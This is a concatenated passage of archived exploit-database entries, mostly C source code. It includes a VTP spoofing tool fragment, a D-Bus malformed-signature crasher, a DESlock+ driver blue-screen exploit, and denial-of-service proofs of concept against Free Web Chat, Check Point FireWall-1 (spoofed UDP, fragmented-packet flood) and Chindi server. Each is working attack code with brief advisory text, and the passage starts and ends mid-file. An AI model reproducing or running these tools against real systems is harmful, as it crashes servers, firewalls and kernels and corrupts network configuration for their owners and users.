    u_int8_t aaa[8]={ 0x22,0x00,0x11,0x22,0x11,0x00, 0x00,0x00 };
    struct libnet_ether_addr *mymac;
    char *device;
    char error_information[LIBNET_ERRBUF_SIZE];
    char *domain;

// get options
     while ((opt = getopt(argc, argv, "i:d:")) != -1)
     {
          switch (opt) {
          case 'i':
          device=malloc(strlen(optarg));
          strcpy(device,optarg);
      k=1;
          break;

          case 'd':
          domain=malloc(strlen(optarg));
          strcpy(domain,optarg);
          break;
         
          default: usage(argv[0]);
          }
     }
     if(!k) { printf("  %s -i <interface> -d <vtp domain>\n     must assign the interface\n",argv[0]);exit(1);}

//init libnet

    lhandler=libnet_init(LIBNET_LINK,device,error_information);
    if (!lhandler) {
             fprintf(stderr, "libnet_init: %s\n", error_information);
             return -1;
     }

    mymac=libnet_get_hwaddr(lhandler);
//build the first packet for vtp_summary
    vtp_len = sizeof(cisco_data)+sizeof(struct vtp_summary);
    vtp_packet = calloc(1,vtp_len);
    aux = vtp_packet;
    memcpy(vtp_packet,cisco_data,sizeof(cisco_data));
    aux+=sizeof(cisco_data);
    vtp_summ = (struct vtp_summary *)aux;
    vtp_summ->version = 0x01;
    vtp_summ->code = 0x01;//vtp_summary
    vtp_summ->followers = 0x01;
    vtp_summ->dom_len = strlen(domain);
    memcpy(vtp_summ->domain,domain,strlen(domain));
    vtp_summ->revision = htonl(2000);//bigger than the current revision number will ok
    t = libnet_build_802_2(
        0xaa,            /* DSAP */
        0xaa,            /* SSAP */
        0x03,            /* control */
        vtp_packet,      /* payload */
        vtp_len,         /* payload size */
        lhandler,        /* libnet handle */
        0);              /* libnet id */
    t = libnet_build_802_3(
        dst_mac,       /* ethernet destination */
        mymac->ether_addr_octet,     /* ethernet source */
        LIBNET_802_2_H + vtp_len, /* frame size */
        NULL,                     /* payload */
        0,                        /* payload size */
        lhandler,                 /* libnet handle */
        0);                       /* libnet id */

     sent = libnet_write(lhandler);

     if (sent == -1) {
        libnet_clear_packet(lhandler);
        free(vtp_packet);
        return -1;
     }
     libnet_clear_packet(lhandler);
    
//build the second vtp packet for vtp_subset
     vtp_len = sizeof(cisco_data)+sizeof(struct vtp_subset);
     vtp_packet2 = calloc(1,vtp_len);
     aux = vtp_packet2;
     memcpy(vtp_packet2,cisco_data,sizeof(cisco_data));
     aux+=sizeof(cisco_data);
    
     vtp_sub = (struct vtp_subset *)aux;
     vtp_sub->version = 0x01;
     vtp_sub->code = 0x02; //vtp_subset
     vtp_sub->seq = 0x01;
     vtp_sub->dom_len = strlen(domain);
     memcpy(vtp_sub->domain,domain,strlen(domain));
     vtp_sub->revision = htonl(2000);//bigger than the current revision number will ok
//     memcpy(vtp_sub->aaa,aaa,strlen(aaa));
    
    t = libnet_build_802_2(
        0xaa,            /* DSAP */
        0xaa,            /* SSAP */
        0x03,            /* control */
        vtp_packet2,      /* payload */
        vtp_len,         /* payload size */
        lhandler,        /* libnet handle */
        0);              /* libnet id */
    t = libnet_build_802_3(
        dst_mac,       /* ethernet destination */
        mymac->ether_addr_octet,     /* ethernet source */
        LIBNET_802_2_H + vtp_len, /* frame size */
        NULL,                     /* payload */
        0,                        /* payload size */
        lhandler,                 /* libnet handle */
        0);                       /* libnet id */

     sent = libnet_write(lhandler);
     if (sent == -1) {
        libnet_clear_packet(lhandler);
        free(vtp_packet);
        return -1;
     }
     libnet_clear_packet(lhandler);
}

// milw0rm.com [2009-01-14]
/*
 * cve-2008-3834.c
 *
 * D-Bus Daemon Denial of Service < 1.2.4
 * Jon Oberheide <jon@oberheide.org>
 * http://jon.oberheide.org
 *
 * Usage:
 *
 *   $ gcc `pkg-config dbus-1 --cflags` cve-2008-3834.c `pkg-config dbus-1 --libs` -o cve-2008-3834
 *   $ ./cve-2008-3834
 *  
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3834
 *
 *   The dbus_signature_validate function in the D-bus library (libdbus) 
 *   before 1.2.4 allows remote attackers to cause a denial of service 
 *   (application abort) via a message containing a malformed signature,
 *   which triggers a failed assertion error. 
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <dbus/dbus.h>

#define DEST "org.freedesktop.ExampleService"
#define NAME "org.freedesktop.ExampleInterface.ExampleMethod"
#define PATH "/org/freedesktop/sample/object/name"
#define SIGNAL "ExampleMethod"

int
main(int argc, char *argv[])
{
	char sig[8];
	uint32_t val = 0xdeadbeef;
	DBusMessage *message;
	DBusConnection *system, *session;
	DBusMessageIter iter1, iter2, iter3, iter4;

	printf("[+] creating malicious dbus message...\n");

	message = dbus_message_new_signal(PATH, NAME, SIGNAL);
	if (!message) {
		printf("[-] error: could not create dbus message\n");
		return 1;
	}
	if (!dbus_message_set_destination(message, DEST)) {
		printf("[-] error: could not create set dbus destination\n");
		return 1;
	}

	sig[0] = DBUS_DICT_ENTRY_BEGIN_CHAR;
	sig[1] = DBUS_STRUCT_BEGIN_CHAR;
	sig[2] = DBUS_TYPE_INT32;
	sig[3] = DBUS_TYPE_INT32;
	sig[4] = DBUS_STRUCT_END_CHAR;
	sig[5] = DBUS_TYPE_INT32;
	sig[6] = DBUS_DICT_ENTRY_END_CHAR;
	sig[7] = '\0';

	dbus_message_iter_init_append(message, &iter1);
	dbus_message_iter_open_container(&iter1, DBUS_TYPE_ARRAY, sig, &iter2);
	dbus_message_iter_open_container(&iter2, DBUS_TYPE_DICT_ENTRY, NULL, &iter3);
	dbus_message_iter_open_container(&iter3, DBUS_TYPE_STRUCT, NULL, &iter4);
	dbus_message_iter_append_basic(&iter4, DBUS_TYPE_INT32, &val);
	dbus_message_iter_append_basic(&iter4, DBUS_TYPE_INT32, &val);
	dbus_message_iter_close_container(&iter3, &iter4);
	dbus_message_iter_append_basic(&iter3, DBUS_TYPE_INT32, &val);
	dbus_message_iter_close_container(&iter2, &iter3);
	dbus_message_iter_close_container(&iter1, &iter2);

	printf("[+] connecting to dbus system daemon...\n");

	system = dbus_bus_get(DBUS_BUS_SYSTEM, NULL);

	if (system) {
		printf("[+] killing dbus system daemon...\n");

		dbus_connection_send(system, message, NULL);
		dbus_connection_flush(system);
		dbus_connection_unref(system);
	} else {
		printf("[-] error: could not connect to dbus system daemon\n");
	}

	printf("[+] connecting to dbus session daemon...\n");

	session = dbus_bus_get(DBUS_BUS_SESSION, NULL);

	if (session) {
		printf("[+] killing dbus session daemon...\n");

		dbus_connection_send(session, message, NULL);
		dbus_connection_flush(session);
		dbus_connection_unref(session);
	} else {
		printf("[-] error: could not connect to dbus session daemon\n");
	}

	dbus_message_unref(message);

	return 0;
}

// milw0rm.com [2009-01-19]
////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | Data Encryption Systems Ltd. - http://www.deslock.com/                     | //
// | Data Encryption Systems DESlock+ - 3.2.7                                   | //
// | DESlock+ Virtual Token Driver - 1.0.2.43 - vdlptokn.sys                    | //
// | DoS Exploit                                                                | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 21 September 2008                                                          | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define IMP_VOID __declspec(dllimport) VOID __stdcall
#define IMP_SYSCALL __declspec(dllimport) NTSTATUS __stdcall

#define OBJ_CASE_INSENSITIVE 0x00000040
#define FILE_OPEN_IF 0x00000003

typedef ULONG NTSTATUS;

typedef struct _UNICODE_STRING 
{
    /* 0x00 */ USHORT Length;
    /* 0x02 */ USHORT MaximumLength;
    /* 0x04 */ PWSTR Buffer;
    /* 0x08 */
}
    UNICODE_STRING,
  *PUNICODE_STRING,
**PPUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    /* 0x00 */ ULONG Length;
    /* 0x04 */ HANDLE RootDirectory;
    /* 0x08 */ PUNICODE_STRING ObjectName;
    /* 0x0C */ ULONG Attributes;
    /* 0x10 */ PSECURITY_DESCRIPTOR SecurityDescriptor;
    /* 0x14 */ PSECURITY_QUALITY_OF_SERVICE SecurityQualityOfService;
    /* 0x18 */
}
    OBJECT_ATTRIBUTES,
  *POBJECT_ATTRIBUTES,
**PPOBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK
{ 
    union
    { 
        /* 0x00 */ NTSTATUS Status; 
        /* 0x00 */ PVOID Pointer; 
    }; 

    /* 0x04 */ ULONG Information;
    /* 0x08 */
}
    IO_STATUS_BLOCK,
  *PIO_STATUS_BLOCK,
**PPIO_STATUS_BLOCK;

typedef VOID (NTAPI *PIO_APC_ROUTINE)
(
    IN PVOID ApcContext,
    IN PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG Reserved
);

IMP_VOID RtlInitUnicodeString
(
    IN OUT PUNICODE_STRING DestinationString,
    IN PCWSTR SourceString
);

IMP_VOID RtlFreeUnicodeString
(
    IN PUNICODE_STRING UnicodeString
);

IMP_SYSCALL NtCreateFile
(
    OUT PHANDLE FileHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN PLARGE_INTEGER AllocationSize OPTIONAL,
    IN ULONG FileAttributes,
    IN ULONG ShareAccess,
    IN ULONG CreateDisposition,
    IN ULONG CreateOptions,
    IN PVOID EaBuffer OPTIONAL,
    IN ULONG EaLength
);

IMP_SYSCALL NtDeviceIoControlFile
(
    IN HANDLE FileHandle,
    IN HANDLE Event OPTIONAL,
    IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
    IN PVOID ApcContext OPTIONAL,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG IoControlCode,
    IN PVOID InputBuffer OPTIONAL,
    IN ULONG InputBufferLength,
    OUT PVOID OutputBuffer OPTIONAL,
    IN ULONG OutputBufferLength
);

IMP_SYSCALL NtClose
(
    IN HANDLE Handle
);

IMP_SYSCALL NtDelayExecution
(
    IN BOOLEAN Alertable,
    IN PLARGE_INTEGER Interval
);

int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;
    
    HANDLE DeviceHandle;
    
    UNICODE_STRING DeviceName;
    OBJECT_ATTRIBUTES ObjectAttributes;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER Interval;

    ///////////////////////////////////////////////////////////////////////////////////////////////
    
    system("cls");
    
    printf( " +----------------------------------------------------------------------------+\n"
            " |                                                                            |\n"
            " | Data Encryption Systems Ltd. - http://www.deslock.com/                     |\n"
            " | Data Encryption Systems DESlock+ - 3.2.7                                   |\n"
            " | DESlock+ Virtual Token Driver - 1.0.2.43 - vdlptokn.sys                    |\n"
            " | DoS Exploit                                                                |\n"
            " |                                                                            |\n"
            " +----------------------------------------------------------------------------+\n"
            " |                                                                            |\n"
            " | NT Internals - http://www.ntinternals.org/                                 |\n"
            " | alex ntinternals org                                                       |\n"
            " | 21 September 2008                                                          |\n"
            " |                                                                            |\n"
            " +----------------------------------------------------------------------------+\n\n");

    ///////////////////////////////////////////////////////////////////////////////////////////////
    
    RtlInitUnicodeString(&DeviceName, L"\\Device\\DLPTokenWalter0");

    ObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    ObjectAttributes.RootDirectory = 0;
    ObjectAttributes.ObjectName = &DeviceName;
    ObjectAttributes.Attributes = OBJ_CASE_INSENSITIVE;
    ObjectAttributes.SecurityDescriptor = NULL;
    ObjectAttributes.SecurityQualityOfService = NULL;

    
    NtStatus = NtCreateFile(
                            &DeviceHandle,                      // FileHandle
                            FILE_READ_DATA | FILE_WRITE_DATA,   // DesiredAccess
                            &ObjectAttributes,                  // ObjectAttributes
                            &IoStatusBlock,                     // IoStatusBlock
                            NULL,                               // AllocationSize OPTIONAL
                            0,                                  // FileAttributes
                            FILE_SHARE_READ | FILE_SHARE_WRITE, // ShareAccess
                            FILE_OPEN_IF,                       // CreateDisposition
                            0,                                  // CreateOptions
                            NULL,                               // EaBuffer OPTIONAL
                            0);                                 // EaLength

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtCreateFile - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlFreeUnicodeString(&DeviceName);

    ///////////////////////////////////////////////////////////////////////////////////////////////

    Interval.LowPart = 0xFF676980;
    Interval.HighPart = 0xFFFFFFFF;

    printf(" 3");
    NtDelayExecution(FALSE,    &Interval);
    
    printf(" 2");
    NtDelayExecution(FALSE,    &Interval);

    printf(" 1");
    NtDelayExecution(FALSE,    &Interval);

    printf(" BSoD\n\n");
    NtDelayExecution(FALSE,    &Interval);


    NtStatus = NtDeviceIoControlFile(
                                     DeviceHandle,    // FileHandle
                                     NULL,            // Event
                                     NULL,            // ApcRoutine
                                     NULL,            // ApcContext
                                     &IoStatusBlock,  // IoStatusBlock
                                     0x002220C0,      // IoControlCode
                                     NULL,            // InputBuffer
                                     0,               // InputBufferLength
                                     NULL,            // OutputBuffer
                                     0);              // OutBufferLength
    
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtDeviceIoControlFile - 0x%.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtClose(DeviceHandle);  // Handle
    
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtClose - 0x%.8X\n", NtStatus);    
        return NtStatus;
    }
    
    return 0;
}

// milw0rm.com [2008-09-21]
source: http://www.securityfocus.com/bid/10863/info

Free Web Chat server is reported prone to multiple denial of service vulnerabilities. The following issues are reported:

The first denial of service vulnerability reported results from a lack of sufficient sanitization performed on username data. It is reported that a user with a void name may be added. This action will result in a NullPointerException.

A remote attacker may exploit this vulnerability to deny service to legitimate users.

The second denial of service vulnerability is reported to exist due to resource consumption. It is reported that the Free Web Chat server does not properly manage multiple connections that originate from the same location.

A remote attacker may exploit this vulnerability to deny service to legitimate users.

/*
     Free Web Chat (Initial Release)- DoS - Proof Of Concept
     Coded by: Donato Ferrante
*/



#include <stdio.h>
#include <stdlib.h>

#ifdef WIN32
    #include <windows.h>
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <arpa/inet.h>
    #include <netdb.h>
#endif

#define VERSION "0.1"





void FreeWebChatPoC( char *host, int port );
u_long resolv(char *host);




int main(int argc, char *argv[]) {

   fprintf(
        stdout,
        "\n\nFree Web Chat - DoS - Proof Of Concept\n"
        "Version: %s\n\n"
        "coded by: Donato Ferrante\n"
        "e-mail:   fdonato@autistici.org\n"
        "web:      www.autistici.org/fdonato\n\n"
        , VERSION
        );

  if(argc <= 2){
     fprintf(stdout, "Usage: <host> <port>");
     exit(-1);
  }

int port = atoi(argv[2]);

#ifdef WIN32
    WSADATA wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    FreeWebChatPoC( argv[1], port );

    return(0);
}







   void FreeWebChatPoC( char *host, int port ){

    struct sockaddr_in peer;

    int sd,
        err;

    peer.sin_addr.s_addr = resolv(host);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;


    char *buff = (char *)malloc(513);

    fprintf(
            stdout,
            "\nConnecting to: %s:%hu\n\n",
            inet_ntoa(peer.sin_addr),
            port
          );

      sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
           if(sd < 0){
                perror("Error");
                exit(-1);
           }

      err = connect(sd, (struct sockaddr *)&peer, sizeof(peer));
           if(err < 0){
                perror("Error");
                exit(-1);
           }

      err = recv(sd, buff, 512, 0);
           if(err < 0){
                perror("Error");
                exit(-1);
           }

#ifdef WIN32
      closesocket(sd);
#else
      close(sd);
#endif

    free(buff);

    fprintf(
          stdout,
          "\nFree_Web_Chat - DoS - Proof_Of_Concept terminated.\n\n"
    );

}




u_long resolv(char *host) {
    struct      hostent *hp;
    u_long      host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }

    return(host_ip);
}




source: http://www.securityfocus.com/bid/1419/info

If Checkpoint Firewall-1 receives a number of spoofed UDP packets with Source IP = Destination IP, the firewall (and likely the machine hosting it) crashes.

NOTE:

This vulnerability while being posted to Bugtraq is currently being denied as a problem by the vendor. The following text was sent to SecurityFocus.

"Check Point takes this and all other possible security issues very seriously. In this case, we have made every effort to work with the authors and reproduce the reported behavior. However, even after extensive testing we have been unable to reproduce this vulnerability. This testing was done both with and without IP Spoofing protection enabled, with the provided source code and other tools. The authors could not provide us with valid FireWall-1 version information, although 3.0, 4.0, and 4.1 are listed as vulnerable; please note that version 3.0 is no longer supported on non-embedded platforms.

/*
 *  CheckPoint IP Firewall Denial of Service Attack
 *  July 2000 
 *
 *  Bug found by: antipent <rtodd@antipentium.com>
 *  Code by: lore <fiddler@antisocial.com>
 *
 *  [Intro]
 *
 *  CheckPoint IP firewall crashes when it detects packets coming from
 *  a different MAC with the same IP address as itself. We simply
 *  send a few spoofed UDP packets to it, 100 or so should usually do
 *  it.
 *
 *  [Impact]
 *
 *  Crashes the firewall and usually the box its running on. Resulting
 *  in a complete stand still on the networks internet connectivity.
 *
 *  [Solution]
 *
 *  Turn on anti-spoofing, the firewall has an inbuilt function to do
 *  this.
 *
 *  [Disclaimer]
 *
 *  Don't use this code. It's for educational purposes.
 *
 *  [Example]
 *
 *  ./cpd 1.2.3.4 500 53
 *
 *  [Compile]
 *
 *  cc -o cpd cpd.c
 *
 *  [Support]
 *
 *  This is designed to compile on Linux. I would port it, but you're
 *  not meant to be running it anyway, right?
 *
 *  -- lore
 */

#define __BSD_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_udp.h>

#define TRUE   1
#define FALSE  0
#define ERR   -1

typedef u_long         ip_t;
typedef long           sock_t;
typedef struct ip      iph_t;
typedef struct udphdr  udph_t;
typedef u_short        port_t;

#define IP_SIZE  (sizeof(iph_t))
#define UDP_SIZE (sizeof(udph_t))
#define PSIZE    (IP_SIZE + UDP_SIZE)
#define IP_OFF   (0)
#define UDP_OFF  (IP_OFF + IP_SIZE)

void     usage               __P ((u_char *));
u_short  checksum            __P ((u_short *, int));

int main (int argc, char * * argv)
{
  ip_t victim;
  sock_t fd;
  iph_t * ip_ptr;
  udph_t * udp_ptr;
  u_char packet[PSIZE];
  u_char * yes = "1";
  struct sockaddr_in sa;
  port_t aport;  
  u_long packets; 

  if (argc < 3) 
  {
    usage (argv[0]);
  }
  
  fprintf(stderr, "\n*** CheckPoint IP Firewall DoS\n");
  fprintf(stderr, "*** Bug discovered by: antipent <rtodd@antipentium.com>\n");
  fprintf(stderr, "*** Code by: lore <fiddler@antisocial.com>\n\n");

  if ((victim = inet_addr(argv[1])) == ERR)
  {
    fprintf(stderr, "Bad IP address '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
  }

  else if (!(packets = atoi(argv[2])))
  {
    fprintf(stderr, "You should send at least 1 packet\n");
    exit(EXIT_FAILURE);
  }

  else if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == ERR)
  {
    fprintf(stderr, "Couldn't create raw socket: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }
 
  else if ((setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &yes, 1)) == ERR)
  {
    fprintf(stderr, "Couldn't set socket options: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
  }

  srand((unsigned)time(NULL));

  if (argc > 3)
  { 
    aport = htons(atoi(argv[3]));
  }
  else
  {
    aport = htons(rand() % 65535 + 1);
  }

  fprintf(stderr, "Sending packets: ");

  while (packets--)
  {

    memset(packet, 0, PSIZE);

    ip_ptr = (iph_t *)(packet + IP_OFF);
    udp_ptr = (udph_t *)(packet + UDP_OFF);

    ip_ptr->ip_hl = 5;
    ip_ptr->ip_v = 4;
    ip_ptr->ip_tos = 0;
    ip_ptr->ip_len = PSIZE;
    ip_ptr->ip_id = 1234;
    ip_ptr->ip_off = 0;
    ip_ptr->ip_ttl = 255;
    ip_ptr->ip_p = IPPROTO_UDP;
    ip_ptr->ip_sum = 0;
    ip_ptr->ip_src.s_addr = victim;
    ip_ptr->ip_dst.s_addr = victim; 

    udp_ptr->source = htons(rand() % 65535 + 1);
    udp_ptr->dest = aport;
    udp_ptr->len = htons(UDP_SIZE);
    udp_ptr->check = checksum((u_short *)ip_ptr, PSIZE);

    sa.sin_port = htons(aport);
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = victim;

    if ((sendto(fd, 
                packet,
                PSIZE,
                0,
                (struct sockaddr *)&sa,
                sizeof(struct sockaddr_in))) == ERR)
    {
      fprintf(stderr, "Couldn't send packet: %s\n",
        strerror(errno));
      close(fd);
      exit(EXIT_FAILURE);
    }
    fprintf(stderr, ".");

  }

  fprintf(stderr, "\n");
  close(fd);

  return (EXIT_SUCCESS);
}

void usage (u_char * pname)
{
  fprintf(stderr, "Usage: %s <victim_ip> <packets> [port]\n", pname);
  exit(EXIT_SUCCESS);
}

u_short checksum (u_short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;

   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }

   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }

   sum = (sum >> 16) + (sum + 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}

/* EOF */

source: http://www.securityfocus.com/bid/1312/info

By sending illegally fragmented packets directly to or routed through Check Point FireWall-1, it is possible to force the firewall to use 100% of available processor time logging these packets. The FireWall-1 rulebase cannot prevent this attack and it is not logged in the firewall logs. 

/*
 * File:   jolt2.c
 * Author: Phonix <phonix@moocow.org>
 * Date:   23-May-00
 *
 * Description: This is the proof-of-concept code for the
 *              Windows denial-of-serice attack described by
 *              the Razor team (NTBugtraq, 19-May-00)
 *              (MS00-029).  This code causes cpu utilization
 *              to go to 100%.
 *
 * Tested against: Win98; NT4/SP5,6; Win2K
 *
 * Written for: My Linux box.  YMMV.  Deal with it.
 *
 * Thanks: This is standard code.  Ripped from lots of places.
 *         Insert your name here if you think you wrote some of
 *         it.  It's a trivial exploit, so I won't take credit
 *         for anything except putting this file together.
 */

#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <getopt.h>

struct _pkt
{
  struct iphdr    ip;
  union {
    struct icmphdr  icmp;
    struct udphdr   udp;
  }  proto;
  char data;
} pkt;

int icmplen  = sizeof(struct icmphdr),
    udplen   = sizeof(struct udphdr),
    iplen    = sizeof(struct iphdr),
    spf_sck;

void usage(char *pname)
{
  fprintf (stderr, "Usage: %s [-s src_addr] [-p port] dest_addr\n",
           pname);
  fprintf (stderr, "Note: UDP used if a port is specified, otherwise ICMP\n");
  exit(0);
}

u_long host_to_ip(char *host_name)
{
  static  u_long ip_bytes;
  struct hostent *res;

  res = gethostbyname(host_name);
  if (res == NULL)
    return (0);
  memcpy(&ip_bytes, res->h_addr, res->h_length);
  return (ip_bytes);
}

void quit(char *reason)
{
  perror(reason);
  close(spf_sck);
  exit(-1);
}

int do_frags (int sck, u_long src_addr, u_long dst_addr, int port)
{
  int     bs, psize;
  unsigned long x;
  struct  sockaddr_in to;

  to.sin_family = AF_INET;
  to.sin_port = 1235;
  to.sin_addr.s_addr = dst_addr;

  if (port)
    psize = iplen + udplen + 1;
  else
    psize = iplen + icmplen + 1;
  memset(&pkt, 0, psize);

  pkt.ip.version = 4;
  pkt.ip.ihl = 5;
  pkt.ip.tot_len = htons(iplen + icmplen) + 40;
  pkt.ip.id = htons(0x455);
  pkt.ip.ttl = 255;
  pkt.ip.protocol = (port ? IPPROTO_UDP : IPPROTO_ICMP);
  pkt.ip.saddr = src_addr;
  pkt.ip.daddr = dst_addr;
  pkt.ip.frag_off = htons (8190);

  if (port)
  {
    pkt.proto.udp.source = htons(port|1235);
    pkt.proto.udp.dest = htons(port);
    pkt.proto.udp.len = htons(9);
    pkt.data = 'a';
  } else {
    pkt.proto.icmp.type = ICMP_ECHO;
    pkt.proto.icmp.code = 0;
    pkt.proto.icmp.checksum = 0;
  }

  while (1) {
    bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
              sizeof(struct sockaddr));
  }
  return bs;
}

int main(int argc, char *argv[])
{
  u_long  src_addr, dst_addr;
  int i, bs=1, port=0;
  char hostname[32];

  if (argc < 2)
    usage (argv[0]);

  gethostname (hostname, 32);
  src_addr = host_to_ip(hostname);

  while ((i = getopt (argc, argv, "s:p:h")) != EOF)
  {
    switch (i)
    {
      case 's':
        dst_addr = host_to_ip(optarg);
        if (!dst_addr)
          quit("Bad source address given.");
        break;

      case 'p':
        port = atoi(optarg);
        if ((port <=0) || (port > 65535))
          quit ("Invalid port number given.");
        break;

      case 'h':
      default:
        usage (argv[0]);
    }
  }

  dst_addr = host_to_ip(argv[argc-1]);
  if (!dst_addr)
    quit("Bad destination address given.");

  spf_sck = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (!spf_sck)
    quit("socket()");
  if (setsockopt(spf_sck, IPPROTO_IP, IP_HDRINCL, (char *)&bs,
      sizeof(bs)) < 0)
    quit("IP_HDRINCL");

  do_frags (spf_sck, src_addr, dst_addr, port);
}
/***************************************************
* Chindi server 1.0  Denial of Service
* Proof of Concept by Luca Ercoli  luca.ercoli at inwind.it
* After DoS, server appears to be up, but will not allow
* new connections.                                           
****************************************************

#include 
#include 
#include 
#include 
#include 

#define PORT    4444
#define DOS     "crash"


int main(int argc, char *argv[]){

int nOpt,count,sockfd;
struct hostent *he;
struct sockaddr_in server_addr;

char *host;

printf ("\nChindi server 1.0 remote DoS\n\n");

if(argc < 2 ) {
                printf ("Usage: %s -t target\n",argv[0]);
                exit(0);
        }

while((nOpt = getopt(argc, argv, "t")) != -1) {

        switch(nOpt) {
                        case 't':
                        host = optarg;
                        break;
                        default:exit(0);
                }
        }

if ((he = gethostbyname(argv[2])) == NULL)
          {
                  herror("gethostbyname");
                  exit(1);
          }

server_addr.sin_family = AF_INET;
server_addr.sin_port = htons(PORT);
server_addr.sin_addr = *((struct in_addr *) he->h_addr);

sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

if (connect (sockfd, (struct sockaddr *) &server_addr,sizeof(struct 
sockaddr)) == -1)
          {
                  perror("Connect");
                  exit(1);
          }

printf("1. Connected\n");
sleep(1);
printf("2. Sending crash string\n");
sleep(1);
printf("3. Verifing server status: ");
sleep(1);

for (count=0; count<9999; count++) send(sockfd,DOS,strlen(DOS),0);

close(sockfd);


// milw0rm.com [2003-04-18]
/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>

#ifdef WIN32
    #include <winsock.h>
/*
   Header file used for manage errors in Windows
   It support socket and errno too
   (this header replace the previous sock_errX.h)
*/

#include <string.h>
#include <errno.h>



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = "Interrupted system call"; break;
        case 10009: error = "Bad file number"; break;
        case 10013: error = "Permission denied"; break;
        case 10014: error = "Bad address"; break;
        case 10022: error = "Invalid argument (not bind)"; break;
        case 10024: error = "Too many open files"; break;
        case 10035: error = "Operation would block"; break;
        case 10036: error = "Operation now in progress"; break;
        case 10037: error = "Operation already in progress"; break;
        case 10038: error = "Socket operation on non-socket"; break;
        case 10039: error = "Destination address required"; break;
        case 10040: error = "Message too long"; break;
        case 10041: error = "Protocol wrong type for socket"; break;
        case 10042: error = "Bad protocol option"; break;
        case 10043: error = "Protocol not supported"; break;
        case 10044: error = "Socket type not supported"; break;
        case 10045: error = "Operation not supported on socket"; break;
        case 10046: error = "Protocol family not supported"; break;
        case 10047: error = "Address family not supported by protocol family"; break;
        case 10048: error = "Address already in use"; break;
        case 10049: error = "Can't assign requested address"; break;
        case 10050: error = "Network is down"; break;
        case 10051: error = "Network is unreachable"; break;
        case 10052: error = "Net dropped connection or reset"; break;
        case 10053: error = "Software caused connection abort"; break;
        case 10054: error = "Connection reset by peer"; break;
        case 10055: error = "No buffer space available"; break;
        case 10056: error = "Socket is already connected"; break;
        case 10057: error = "Socket is not connected"; break;
        case 10058: error = "Can't send after socket shutdown"; break;
        case 10059: error = "Too many references, can't splice"; break;
        case 10060: error = "Connection timed out"; break;
        case 10061: error = "Connection refused"; break;
        case 10062: error = "Too many levels of symbolic links"; break;
        case 10063: error = "File name too long"; break;
        case 10064: error = "Host is down"; break;
        case 10065: error = "No Route to Host"; break;
        case 10066: error = "Directory not empty"; break;
        case 10067: error = "Too many processes"; break;
        case 10068: error = "Too many users"; break;
        case 10069: error = "Disc Quota Exceeded"; break;
        case 10070: error = "Stale NFS file handle"; break;
        case 10091: error = "Network SubSystem is unavailable"; break;
        case 10092: error = "WINSOCK DLL Version out of range"; break;
        case 10093: error = "Successful WSASTARTUP not yet performed"; break;
        case 10071: error = "Too many levels of remote in path"; break;
        case 11001: error = "Host not found"; break;
        case 11002: error = "Non-Authoritative Host not found"; break;
        case 11003: error = "Non-Recoverable errors: FORMERR, REFUSED, NOTIMP"; break;
        case 11004: error = "Valid name, no data record of requested type"; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, "\nError: %s\n", error);
    exit(1);
}

// inserted winerr.h /str0ke

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
